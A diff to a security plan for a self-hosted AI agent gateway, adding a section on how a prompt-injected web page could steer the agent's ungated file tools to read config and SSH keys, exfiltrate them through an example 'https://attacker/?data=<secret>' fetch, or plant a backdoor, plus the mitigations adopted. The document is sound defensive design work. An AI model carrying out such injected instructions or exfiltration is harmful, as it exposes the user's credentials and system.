@@ -1,7 +1,8 @@
 # Security plan: closing the bash free-for-all
 
 Written 2026-09-08. Status: **implemented** — `src/security.ts`, `/allow` in `src/index.ts`,
-hardening in `pi-gateway.service`; self-check: `npx tsx tests/security-check.ts`.
+hardening in `pi-gateway.service`, ungated file-tool exclusion + fetch guard
+(issue #82); self-check: `npx tsx tests/security-check.ts`.
 
 ## Threat model
 
@@ -73,13 +74,43 @@ RestrictSudo=yes
   integration) is still stronger. Overkill for a single-user box today; the
   upgrade path if the agent starts touching untrusted repos.
 
+## Ungated built-in file tools (issue #82)
+
+The bash gate only covers bash. pi ships built-in `read`/`edit`/`write` tools that
+resolve absolute paths and `~` with no sandbox and write anywhere the OS user can
+(`ReadWritePaths=%h/GAIA` makes the cwd writable). A prompt-injected page could use
+them to read `~/.pi-gateway/config.json` / `~/.ssh/id_rsa` (and exfiltrate via
+`fetchpage` to a public server) or to rewrite `src/index.ts`/`config.json` for a
+persistent backdoor — all without ever touching bash, so neither the gate nor
+memory staging engages.
+
+Mitigations (all wired in `src/session.ts` / `src/web.ts`):
+
+- **File tools excluded from sessions.** `createAgentSession` gets
+  `excludeTools: ["read", "edit", "write"]`, so every file access flows through
+  the `bash` allowlist (our custom `bash` shadows the built-in by name).
+  `runOneShot` does the same unless an explicit `tools` allowlist is passed
+  (e.g. `/plan` deliberately allows `read` for a trusted one-shot turn).
+- **No file-mutation tool survives**, so there is no write channel to tamper with
+  `index.ts`/`config.json`; the `allowedChatIds` allow-list and the bash gate
+  can't be edited away by the model.
+- **`fetchpage` refuses query-bearing URLs.** The remaining exfiltration channel
+  would be `fetchpage` to `https://attacker/?data=<secret>`; `safeFetch` only
+  blocks private hosts, so a public server is fine. fetchpage now refuses any URL
+  with a query string (websearch posts its query in the body and is unaffected),
+  and with `read` excluded the model has no secret source to leak anyway.
+
+Ceiling: still a container/VM/VPS (pi's docs point at a Gondolin micro-VM).
+
 ## Explicitly skipped
 
 - **Deny-lists** — the allowlist subsumes them.
 - **DM pairing** — `allowedChatIds` already is that.
-- **Per-tool policies beyond bash** — read/write are bounded by ProtectHome;
-  bash is the escalation vector.
 - **Live y/N approval** — deadlocks against the serialized turn loop (see #2).
+  (`/allow` and the memory gate are the interactive paths instead.)
+- **Per-tool policies beyond bash** — superseded by issue #82: read/edit/write are
+  excluded outright, which is stricter than any per-file policy; bash remains the
+  escalation vector and keeps the gate.
 
 ## Verification
 
